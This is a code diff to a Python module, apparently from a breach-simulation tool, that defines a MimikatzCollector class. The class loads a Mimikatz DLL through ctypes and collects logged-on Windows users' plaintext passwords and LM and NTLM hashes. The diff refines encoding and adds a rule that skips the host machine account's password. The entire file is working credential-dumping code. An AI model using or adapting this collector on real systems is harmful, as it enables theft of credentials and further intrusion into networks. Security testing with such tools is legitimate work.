@@ -1,12 +1,11 @@
 import ctypes
 import binascii
 import logging
+import socket
 
 __author__ = 'itay.mizeretz'
 
 LOG = logging.getLogger(__name__)
-
-
 
 
 class MimikatzCollector:
@@ -24,7 +23,7 @@ class MimikatzCollector:
             self._collect = collect_proto(("collect", self._dll))
             self._get = get_proto(("get", self._dll))
             self._isInit = True
-        except StandardError as ex:
+        except StandardError:
             LOG.exception("Error initializing mimikatz collector")
 
     def get_logon_info(self):
@@ -40,18 +39,28 @@ class MimikatzCollector:
             entry_count = self._collect()
 
             logon_data_dictionary = {}
+            hostname = socket.gethostname()
 
             for i in range(entry_count):
                 entry = self._get()
-                username = str(entry.username)
-                password = str(entry.password)
+                username = entry.username.encode('utf-8').strip()
+
+                password = entry.password.encode('utf-8').strip()
                 lm_hash = binascii.hexlify(bytearray(entry.lm_hash))
                 ntlm_hash = binascii.hexlify(bytearray(entry.ntlm_hash))
-                has_password = (0 != len(password))
+
+                if 0 == len(password):
+                    has_password = False
+                elif (username[-1] == '$') and (hostname.lower() == username[0:-1]):
+                    # Don't save the password of the host domain user (HOSTNAME$)
+                    has_password = False
+                else:
+                    has_password = True
+
                 has_lm = ("00000000000000000000000000000000" != lm_hash)
                 has_ntlm = ("00000000000000000000000000000000" != ntlm_hash)
 
-                if not logon_data_dictionary.has_key(username):
+                if username not in logon_data_dictionary:
                     logon_data_dictionary[username] = {}
                 if has_password:
                     logon_data_dictionary[username]["password"] = password
@@ -61,7 +70,7 @@ class MimikatzCollector:
                     logon_data_dictionary[username]["ntlm_hash"] = ntlm_hash
 
             return logon_data_dictionary
-        except StandardError as ex:
+        except StandardError:
             LOG.exception("Error getting logon info")
             return {}
 
@@ -75,8 +84,8 @@ class MimikatzCollector:
 
         _fields_ = \
             [
-                ("username",    ctypes.c_wchar * WINDOWS_MAX_USERNAME_PASS_LENGTH),
-                ("password",    ctypes.c_wchar * WINDOWS_MAX_USERNAME_PASS_LENGTH),
-                ("lm_hash",     ctypes.c_byte * LM_NTLM_HASH_LENGTH),
-                ("ntlm_hash",   ctypes.c_byte * LM_NTLM_HASH_LENGTH)
+                ("username", ctypes.c_wchar * WINDOWS_MAX_USERNAME_PASS_LENGTH),
+                ("password", ctypes.c_wchar * WINDOWS_MAX_USERNAME_PASS_LENGTH),
+                ("lm_hash", ctypes.c_byte * LM_NTLM_HASH_LENGTH),
+                ("ntlm_hash", ctypes.c_byte * LM_NTLM_HASH_LENGTH)
             ]
